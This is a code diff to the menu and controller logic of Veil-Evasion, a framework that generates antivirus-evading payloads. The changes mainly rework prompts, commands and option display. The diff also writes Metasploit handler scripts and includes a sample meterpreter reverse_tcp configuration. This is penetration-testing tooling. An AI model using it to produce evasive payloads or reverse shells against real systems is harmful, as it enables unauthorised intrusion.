@@ -28,55 +28,31 @@ if os.path.exists("/etc/veil/settings.py"):
         try:
             settings.VEIL_EVASION_PATH
         except AttributeError:
-            os.system('clear')
-            print '========================================================================='
+            #os.system('clear')
+            print '\n========================================================================='
             print ' New major Veil-Evasion version installed'
-            print ' Re-running ./setup/setup.sh'
             print '========================================================================='
-            time.sleep(3)
-            os.system('cd setup && ./setup.sh')
-
-            # reload the settings import to refresh the values
-            reload(settings)
+            print '\n [*] Manually run: bash %s -s' % os.path.abspath("setup/setup.sh")
+            sys.exit()
 
     except ImportError:
-        print "\n [!] ERROR: run ./config/update.py manually\n"
+        print "\n [!] ERROR #1: run %s manually\n" % (os.path.abspath("./config/update.py"))
         sys.exit()
 elif os.path.exists("./config/settings.py"):
     try:
         sys.path.append("./config")
         import settings
     except ImportError:
-        print "\n [!] ERROR: run ./config/update.py manually\n"
+        print "\n [!] ERROR #2: run %s manually\n" % (os.path.abspath("./config/update.py"))
         sys.exit()
 else:
     # if the file isn't found, try to run the update script
-    os.system('clear')
+    #os.system('clear')
+    print '\n========================================================================='
+    print ' Veil First Run Detected...'
     print '========================================================================='
-    print ' Veil First Run Detected... Initializing Script Setup...'
-    print '========================================================================='
-    # run the config if it hasn't been run
-    print '\n [*] Executing ./setup/setup.sh'
-    os.system('cd setup && ./setup.sh')
-
-    # check for the config again and error out if it can't be found.
-    if os.path.exists("/etc/veil/settings.py"):
-        try:
-            sys.path.append("/etc/veil/")
-            import settings
-        except ImportError:
-            print "\n [!] ERROR: run ./config/update.py manually\n"
-            sys.exit()
-    elif os.path.exists("./config/settings.py"):
-        try:
-            sys.path.append("./config")
-            import settings
-        except ImportError:
-            print "\n [!] ERROR: run ./config/update.py manually\n"
-            sys.exit()
-    else:
-        print "\n [!] ERROR: run ./config/update.py manually\n"
-        sys.exit()
+    print '\n [*] Manually run: bash %s -s' % os.path.abspath("setup/setup.sh")
+    sys.exit()
 
 
 from os.path import join, basename, splitext
@@ -101,6 +77,7 @@ class Controller:
         self.payloads = list()
         # a specific payload, so we can set it manually
         self.payload = None
+        self.payloadname = None
         # restrict loaded modules to specific languages
         self.langs = langs
 
@@ -112,19 +89,20 @@ class Controller:
 
         self.outputFileName = ""
 
-        self.commands = [   ("use","use a specific payload"),
-                            ("info","information on a specific payload"),
-                            ("list","list available payloads"),
-                            ("update","update Veil to the latest version"),
-                            ("clean","clean out payload folders"),
-                            ("checkvt","check payload hashes vs. VirusTotal"),
-                            ("exit","exit Veil")]
+        self.commands = [   ("use","Use a specific payload"),
+                            ("info","Information on a specific payload"),
+                            ("list","List available payloads"),
+                            ("update","Update Veil-Evasion to the latest version"),
+                            ("clean","Clean out payload folders"),
+                            ("checkvt","Check payload hashes vs. VirusTotal"),
+                            ("exit","Exit Veil-Evasion")]
 
-        self.payloadCommands = [    ("set","set a specific option value"),
-                                    ("info","show information about the payload"),
-                                    ("generate","generate payload"),
-                                    ("back","go to the main menu"),
-                                    ("exit","exit Veil")]
+        self.payloadCommands = [    ("set","Set a specific option value"),
+                                    ("info","Show information about the payload"),
+                                    ("options","Show payload's options"),
+                                    ("generate","Generate payload"),
+                                    ("back","Go to the main menu"),
+                                    ("exit","exit Veil-Evasion")]
 
         self.LoadPayloads()
 
@@ -133,9 +111,9 @@ class Controller:
         """
         Crawl the module path and load up everything found into self.payloads.
         """
-            
+
         # crawl up to 5 levels down the module path
-        for x in xrange(1,5):    
+        for x in xrange(1,5):
             # make the folder structure the key for the module
 
             d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_EVASION_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )
@@ -154,7 +132,7 @@ class Controller:
         Prints out available payloads in a nicely formatted way.
         """
 
-        print helpers.color(" [*] Available payloads:\n")
+        print helpers.color("\n [*] Available Payloads:\n")
         lastBase = None
         x = 1
         for (name, payload) in self.payloads:
@@ -169,7 +147,7 @@ class Controller:
 
     def UpdateVeil(self, interactive=True):
         """
-        Updates Veil by invoking git pull on the OS 
+        Updates Veil by invoking git pull on the OS
 
         """
         print "\n Updating Veil via git...\n"
@@ -178,7 +156,7 @@ class Controller:
         updoutput, upderr = updater.communicate()
 
         if interactive:
-            raw_input(" [>] Veil updated, press any key to continue: ")
+            raw_input(" [>] Veil updated, press any key to continue.")
 
 
     def CheckVT(self, interactive=True):
@@ -203,61 +181,72 @@ class Controller:
                 if found == False:
                     print " [*] No payloads found on VirusTotal!"
 
-                raw_input("\n [>] Hit enter to continue...")
+                raw_input("\n [>] Press any key to continue...")
 
             else:
                 print helpers.color("\n [!] Hash file is empty, generate a payload first!", warning=True)
-                raw_input("\n [>] Press enter to continue...")
+                raw_input("\n [>] Press any key to continue...")
 
         except OSError as e:
             print helpers.color("\n [!] Error: hash list %s not found" %(settings.HASH_LIST), warning=True)
-            raw_input("\n [>] Press enter to continue...")
+            raw_input("\n [>] Press any key to continue...")
 
 
     def CleanPayloads(self, interactive=True):
         """
         Cleans out the payload source/compiled/handler folders.
         """
-        
+
         # prompt for confirmation if we're in the interactive menu
         if interactive:
             choice = raw_input("\n [>] Are you sure you want to clean payload folders? [y/N] ")
 
             if choice.lower() == "y":
                 print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
-                os.system('rm %s/*.* 2>/dev/null' %(settings.PAYLOAD_SOURCE_PATH))
+                os.system('rm -f %s/*.*' %(settings.PAYLOAD_SOURCE_PATH))
 
                 print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
-                os.system('rm %s/*.exe 2>/dev/null' %(settings.PAYLOAD_COMPILED_PATH))
+                os.system('rm -f %s/*.exe' %(settings.PAYLOAD_COMPILED_PATH))
 
                 print " [*] Cleaning %s" %(settings.HANDLER_PATH)
-                os.system('rm %s/*.rc 2>/dev/null' %(settings.HANDLER_PATH))
+                os.system('rm -f %s/*.rc' %(settings.HANDLER_PATH))
 
                 print " [*] cleaning %s" %(settings.HASH_LIST)
-                os.system('rm %s 2>/dev/null' %(settings.HASH_LIST))
+                os.system('rm -f %s' %(settings.HASH_LIST))
                 os.system('touch ' + settings.HASH_LIST)
 
                 print " [*] cleaning ./tools/vt-notify/results.log"
-                os.system('rm ./tools/vt-notify/results.log 2>/dev/null')
+                os.system('rm -f ./tools/vt-notify/results.log')
 
-                choice = raw_input("\n [>] Folders cleaned, press any key to return to the main menu: ")
-        
+                choice = raw_input("\n [>] Folders cleaned, press any key to return to the main menu.")
+
         else:
             print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
-            os.system('rm %s/*.* 2>/dev/null' %(settings.PAYLOAD_SOURCE_PATH))
+            os.system('rm -f %s/*.*' %(settings.PAYLOAD_SOURCE_PATH))
 
             print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
-            os.system('rm %s/*.exe 2>/dev/null' %(settings.PAYLOAD_COMPILED_PATH))
+            os.system('rm -f %s/*.exe' %(settings.PAYLOAD_COMPILED_PATH))
 
             print " [*] Cleaning %s" %(settings.HANDLER_PATH)
-            os.system('rm %s/*.rc 2>/dev/null' %(settings.HANDLER_PATH))
+            os.system('rm -f %s/*.rc' %(settings.HANDLER_PATH))
 
             print " [*] cleaning %s" %(settings.HASH_LIST)
-            os.system('rm %s 2>/dev/null' %(settings.HASH_LIST))
+            os.system('rm -f %s' %(settings.HASH_LIST))
             os.system('touch ' + settings.HASH_LIST)
 
             print "\n [*] Folders cleaned\n"
 
+    def PayloadOptions(self, payload):
+        print helpers.color("\n Required Options:\n")
+
+        print " Name\t\t\tCurrent Value\tDescription"
+        print " ----\t\t\t-------------\t-----------"
+
+        # sort the dictionary by key before we output, so it looks nice
+        for key in sorted(self.payload.required_options.iterkeys()):
+            print " %s\t%s\t%s" % ('{0: <16}'.format(key), '{0: <8}'.format(payload.required_options[key][0]), payload.required_options[key][1])
+
+        print ""
 
     def PayloadInfo(self, payload, showTitle=True, showInfo=True):
         """
@@ -269,7 +258,7 @@ class Controller:
 
         """
         if showTitle:
-            messages.title()
+            if settings.TERMINAL_CLEAR != "false": messages.title()
 
         if showInfo:
             # extract the payload class name from the instantiated object, then chop off the load folder prefix
@@ -289,17 +278,7 @@ class Controller:
 
         # if required options were specified, output them
         if hasattr(self.payload, 'required_options'):
-            print helpers.color("\n Required Options:\n")
-
-            print " Name\t\t\tCurrent Value\tDescription"
-            print " ----\t\t\t-------------\t-----------"
-
-            # sort the dictionary by key before we output, so it looks nice
-            for key in sorted(self.payload.required_options.iterkeys()):
-                print " %s\t%s\t%s" % ('{0: <16}'.format(key), '{0: <8}'.format(payload.required_options[key][0]), payload.required_options[key][1])
-
-            print ""
-
+            self.PayloadOptions(self.payload)
 
     def SetPayload(self, payloadname, options):
         """
@@ -319,20 +298,51 @@ class Controller:
 
                 # set the internal payload variable
                 self.payload = payload
+                self.payloadname = name
 
-                # options['customShellcode'] = "\x00..."
-                if 'customShellcode' in options:
-                    self.payload.shellcode.setCustomShellcode(options['customShellcode'])
-                # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
-                if 'required_options' in options:
+            # did they enter a number rather than the full payload?
+            elif payloadname.isdigit() and 0 < int(payloadname) <= len(self.payloads):
+                x = 1
+                for (name, pay) in self.payloads:
+                    # if the entered number matches the payload #, use that payload
+                    if int(payloadname) == x:
+                        self.payload = pay
+                        self.payloadname = name
+                    x += 1
+
+        print " Payload: %s\n" % helpers.color(self.payloadname)
+
+        # if payload is found, then go ahead
+        if self.payload:
+
+            # options['customShellcode'] = "\x00..."
+            if 'customShellcode' in options:
+                self.payload.shellcode.setCustomShellcode(options['customShellcode'])
+            # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
+            if 'required_options' in options:
+                try:
                     for k,v in options['required_options'].items():
                         self.payload.required_options[k] = v
-                # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
-                if 'msfvenom' in options:
+                except:
+                    print helpers.color("\n [!] Internal error #4.", warning=True)
+            # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
+            if 'msfvenom' in options:
+                if hasattr(self.payload, 'shellcode'):
                     self.payload.shellcode.SetPayload(options['msfvenom'])
+                else:
+                    print helpers.color("\n [!] Internal error #3: This module does not use msfvenom!", warning=True)
+                    sys.exit()
+
+            if not self.ValidatePayload(self.payload):
+
+                print helpers.color("\n [!] WARNING: Not all required options filled\n", warning=True)
+                self.PayloadOptions(self.payload)
+                print ''
+                sys.exit()
 
         # if a payload isn't found, then list available payloads and exit
-        if not self.payload:
+        else:
+
             print helpers.color(" [!] Invalid payload selected\n\n", warning=True)
             self.ListPayloads()
             sys.exit()
@@ -397,15 +407,15 @@ class Controller:
         # only show get input if we're doing the interactive menu
         if interactive:
             if showTitle:
-                messages.title()
+                if settings.TERMINAL_CLEAR != "false": messages.title()
 
             # Get the base install name for the payloads (i.e. OutputBaseChoice.py/OutputBaseChoice.exe)
-            print " [*] Press [enter] for 'payload'"
-            OutputBaseChoice = raw_input(" [>] Please enter the base name for output files: ")
+            OutputBaseChoice = raw_input("\n [>] Please enter the base name for output files (default is 'payload'): ")
 
             # ensure we get a base name and not a full path
             while OutputBaseChoice != "" and "/" in OutputBaseChoice:
-                OutputBaseChoice = raw_input(helpers.color(" [!] Please enter a base name, not a full path: ", warning=True))
+                print helpers.color(" [!] Please provide a base name, not a path, for the output base", warning=True)
+                OutputBaseChoice = raw_input("\n [>] Please enter the base name for output files (default is 'payload'): ")
 
         # for invalid output base choices that are passed by arguments
         else:
@@ -450,7 +460,7 @@ class Controller:
         payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
         message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname
         handler = ""
-        
+
         if hasattr(payload, 'shellcode'):
             # check if msfvenom was used or something custom, print appropriately
             if payload.shellcode.customshellcode != "":
@@ -470,7 +480,7 @@ class Controller:
                 else:
                     # try to extract this local IP
                     handler += "set LHOST " + helpers.LHOST() + "\n"
-                
+
                 # extract LPORT if it's there
                 p = re.compile('LPORT=(.*?) ')
                 parts = p.findall(payload.shellcode.msfvenomCommand)
@@ -558,6 +568,10 @@ class Controller:
                 if "LPORT" in keys:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
 
+                # grab the LURI value if it was set. ignore the / as that is the default
+                if "LURI" in keys and payload.required_options["LURI"][0] != "/":
+                    handler += "set LURI " + payload.required_options["LURI"][0] + "\n"
+
                 handler += "set ExitOnSession false\n"
                 handler += "exploit -j\n"
 
@@ -574,20 +588,18 @@ class Controller:
                     message += " Handler File:\t\t"+handlerFileName + "\n"
         except:
             # is that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
-            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)
+            print helpers.color("\n [!] Internal error #1. Please run %s manually\n" % (os.path.abspath("./config/update.py")), warning=True)
 
         # print out notes if set
         if hasattr(payload, 'notes'):
             #message += " Notes:\t\t\t" + payload.notes
             message += helpers.formatLong("Notes:", payload.notes, frontTab=False, spacing=24)
 
-        message += "\n"
-
         # check if compile_to_exe is in the required options, if so,
         # call supportfiles.supportingFiles() to compile appropriately
-        if hasattr(self.payload, 'required_options'):
-            if "compile_to_exe" in self.payload.required_options:
-                value = self.payload.required_options['compile_to_exe'][0].lower()[0]
+        if hasattr(self.payload, 'required_options') and self.payload.language.lower() != "powershell":
+            if "COMPILE_TO_EXE" in self.payload.required_options:
+                value = self.payload.required_options['COMPILE_TO_EXE'][0].lower()[0]
 
                 if value == "y" or value==True:
 
@@ -605,10 +617,6 @@ class Controller:
                     # if we're compiling, set the returned file name to the output .exe
                     # so we can return this for external calls to the framework
                     OutputFileName = settings.PAYLOAD_COMPILED_PATH + FinalBaseChoice + ".exe"
- 
-
-        # print the full message containing generation notes
-        print message
 
         # This block of code is going to be used to SHA1 hash our compiled payloads to potentially submit the
         # hash with VTNotify to detect if it's been flagged
@@ -622,17 +630,20 @@ class Controller:
             OutputFile.close()
             HashFile.write(SHA1Hash + ":" + FinalBaseChoice + "\n")
             HashFile.close()
+
+            # print the full message containing generation notes
+            print message
+
+            # print the end message
+            messages.endmsg()
         except:
             # if that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
-            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)
-
-
-        # print the end message
-        messages.endmsg()
+            print helpers.color("\n [!] Internal error #2. Unable to generate output. Please run %s manually\n" % (os.path.abspath("./config/update.py")), warning=True)
 
         if interactive:
-            raw_input(" [>] press any key to return to the main menu: ")
-            #self.MainMenu(showMessage=True)
+            raw_input(" [>] Press any key to return to the main menu.")
+            print ""
+            self.MainMenu(showMessage=True)
 
         return OutputFileName
 
@@ -654,14 +665,14 @@ class Controller:
 
         # show the title if specified
         if showTitle:
-            messages.title()
+            if settings.TERMINAL_CLEAR != "false": messages.title()
 
         # extract the payload class name from the instantiated object
         # YES, I know this is a giant hack :(
         # basically need to find "payloads" in the path name, then build
         # everything as appropriate
         payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
-        print " Payload: " + helpers.color(payloadname) + " loaded\n"
+        print "\n Payload: " + helpers.color(payloadname) + " loaded\n"
 
         self.PayloadInfo(payload, showTitle=False, showInfo=False)
         messages.helpmsg(self.payloadCommands, showTitle=False)
@@ -671,32 +682,32 @@ class Controller:
 
             while True:
 
-                choice = raw_input(" [>] Please enter a command: ").strip()
+                choice = raw_input(" [%s>>]: " % payloadname).strip()
 
                 if choice != "":
 
                     parts = choice.strip().split()
+                    cmd = parts[0].lower()
+
                     # display help menu for the payload
-                    if parts[0] == "info":
+                    if cmd == "info":
                         self.PayloadInfo(payload)
                         choice = ""
-                    if parts[0] == "help":
+                    if cmd == "help":
                         messages.helpmsg(self.payloadCommands)
                         choice = ""
                     # head back to the main menu
-                    if parts[0] == "main" or parts[0] == "back":
+                    if cmd == "main" or cmd == "back" or cmd == "home":
                         #finished = True
                         return ""
                         #self.MainMenu()
-                    if parts[0] == "exit":
+                    if cmd == "exit" or cmd == "end" or cmd == "quit":
                         raise KeyboardInterrupt
-
                     # Update Veil via git
-                    if parts[0] == "update":
+                    if cmd == "update":
                         self.UpdateVeil()
-
                     # set specific options
-                    if parts[0] == "set":
+                    if cmd == "set":
 
                         # catch the case of no value being supplied
                         if len(parts) == 1:
@@ -704,7 +715,7 @@ class Controller:
 
                         else:
 
-                            option = parts[1]
+                            option = parts[1].upper()
                             value = "".join(parts[2:])
 
                             #### VALIDATION ####
@@ -724,15 +735,17 @@ class Controller:
                                             else:
                                                 try:
                                                     payload.required_options[option][0] = value
+                                                    print " [i] %s => %s" % (option, value)
                                                 except KeyError:
-                                                    print helpers.color("\n [!] ERROR: Specify LHOST value in the following screen.\n", warning=True)
+                                                    print helpers.color("\n [!] ERROR #1: Specify LHOST value in the following screen.\n", warning=True)
                                                 except AttributeError:
-                                                    print helpers.color("\n [!] ERROR: Specify LHOST value in the following screen.\n", warning=True)
+                                                    print helpers.color("\n [!] ERROR #2: Specify LHOST value in the following screen.\n", warning=True)
 
                                         # assume we've been passed a domain name
                                         else:
                                             if helpers.isValidHostname(value):
                                                 payload.required_options[option][0] = value
+                                                print " [i] %s => %s" % (option, value)
                                             else:
                                                 print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)
 
@@ -743,6 +756,7 @@ class Controller:
                                     try:
                                         socket.inet_pton(socket.AF_INET6, value)
                                         payload.required_options[option][0] = value
+                                        print " [i] %s => %s" % (option, value)
                                     except socket.error:
                                         print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                         value = ""
@@ -759,6 +773,7 @@ class Controller:
                                     else:
                                         try:
                                             payload.required_options[option][0] = value
+                                            print " [i] %s => %s" % (option, value)
                                         except KeyError:
                                             print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                         except AttributeError:
@@ -770,12 +785,13 @@ class Controller:
                             else:
                                 try:
                                     payload.required_options[option][0] = value
+                                    print " [*] %s => %s" % (option, value)
                                 except:
                                     print helpers.color(" [!] ERROR: Invalid value specified.\n", warning=True)
                                     cmd = ""
 
                     # generate the payload
-                    if parts[0] == "generate":
+                    if cmd == "generate" or cmd == "gen" or cmd == "run" or cmd == "go" or cmd == "do" or cmd == "make":
 
                         # make sure all required options are filled in first
                         if self.ValidatePayload(payload):
@@ -791,6 +807,10 @@ class Controller:
 
                         else:
                             print helpers.color("\n [!] WARNING: not all required options filled\n", warning=True)
+                    if cmd == "options":
+                        # if required options were specified, output them
+                        if hasattr(self.payload, 'required_options'):
+                            self.PayloadOptions(self.payload)
 
 
     def MainMenu(self, showMessage=True, args=None):
@@ -817,23 +837,24 @@ class Controller:
 
                 if showMessage:
                     # print the title, where we are, and number of payloads loaded
-                    messages.title()
+                    if settings.TERMINAL_CLEAR != "false": messages.title()
                     print " Main Menu\n"
                     print "\t" + helpers.color(str(len(self.payloads))) + " payloads loaded\n"
                     messages.helpmsg(self.commands, showTitle=False)
+                    showTitle=False
 
-                cmd = raw_input(' [>] Please enter a command: ').strip()
+                cmd = raw_input(' [menu>>]: ').strip()
 
                 # handle our tab completed commands
                 if cmd.startswith("help"):
-                    messages.title()
+                    if settings.TERMINAL_CLEAR != "false": messages.title()
                     cmd = ""
                     showMessage=False
 
                 elif cmd.startswith("use"):
 
                     if len(cmd.split()) == 1:
-                        messages.title()
+                        if settings.TERMINAL_CLEAR != "false": messages.title()
                         self.ListPayloads()
                         showMessage=False
                         cmd = ""
@@ -850,6 +871,7 @@ class Controller:
                                 # if the entered number matches the payload #, use that payload
                                 if int(p) == x:
                                     self.payload = pay
+                                    self.payloadname = name
                                     self.outputFileName = self.PayloadMenu(self.payload, args=args)
                                 x += 1
 
@@ -859,10 +881,11 @@ class Controller:
                                 # if we find the payload specified, kick off the payload menu
                                 if payloadName == p:
                                     self.payload = pay
-                                    self.outputFileName = self.PayloadMenu(self.payload, args=args)                                        
+                                    self.payloadname = payloadName
+                                    self.outputFileName = self.PayloadMenu(self.payload, args=args)
 
                         cmd = ""
-                        showMessage=True
+                        if settings.TERMINAL_CLEAR != "false": showMessage = True
 
                     # error catchings if not of form [use BLAH]
                     else:
@@ -871,24 +894,24 @@ class Controller:
 
                 elif cmd.startswith("update"):
                     self.UpdateVeil()
-                    showMessage=True
+                    if settings.TERMINAL_CLEAR != "false": showMessage = True
                     cmd = ""
 
                 elif cmd.startswith("checkvt"):
                     self.CheckVT()
-                    showMessage=True
+                    if settings.TERMINAL_CLEAR != "false": showMessage = True
                     cmd = ""
 
                 # clean payload folders
                 if cmd.startswith("clean"):
                     self.CleanPayloads()
-                    showMessage=True
+                    if settings.TERMINAL_CLEAR != "false": showMessage = True
                     cmd = ""
 
                 elif cmd.startswith("info"):
 
                     if len(cmd.split()) == 1:
-                        showMessage=True
+                        if settings.TERMINAL_CLEAR != "false": showMessage = True
                         cmd = ""
 
                     elif len(cmd.split()) == 2:
@@ -903,6 +926,7 @@ class Controller:
                                 # if the entered number matches the payload #, use that payload
                                 if int(p) == x:
                                     self.payload = pay
+                                    self.payloadname = name
                                     self.PayloadInfo(self.payload)
                                 x += 1
 
@@ -912,7 +936,8 @@ class Controller:
                                 # if we find the payload specified, kick off the payload menu
                                 if payloadName == p:
                                     self.payload = pay
-                                    self.PayloadInfo(self.payload) 
+                                    self.payloadname = payloadName
+                                    self.PayloadInfo(self.payload)
 
                         cmd = ""
                         showMessage=False
@@ -922,11 +947,11 @@ class Controller:
                         cmd = ""
                         showMessage=False
 
-                elif cmd.startswith("list"):
+                elif cmd.startswith("list") or cmd.startswith("ls"):
 
                     if len(cmd.split()) == 1:
-                        messages.title()
-                        self.ListPayloads()     
+                        if settings.TERMINAL_CLEAR != "false": messages.title()
+                        self.ListPayloads()
 
                     cmd = ""
                     showMessage=False
@@ -947,15 +972,16 @@ class Controller:
                         # if the entered number matches the payload #, use that payload
                         if int(cmd) == x:
                             self.payload = pay
+                            self.payloadname = name
                             self.outputFileName = self.PayloadMenu(self.payload, args=args)
                         x += 1
                     cmd = ""
-                    showMessage=True
+                    if settings.TERMINAL_CLEAR != "false": showMessage = True
 
                 # if nothing is entered
                 else:
                     cmd = ""
-                    showMessage=True
+                    showMessage=False
 
                 # if we're looping forever on the main menu (Veil.py behavior)
                 # reset the output filname to nothing so we don't break the while
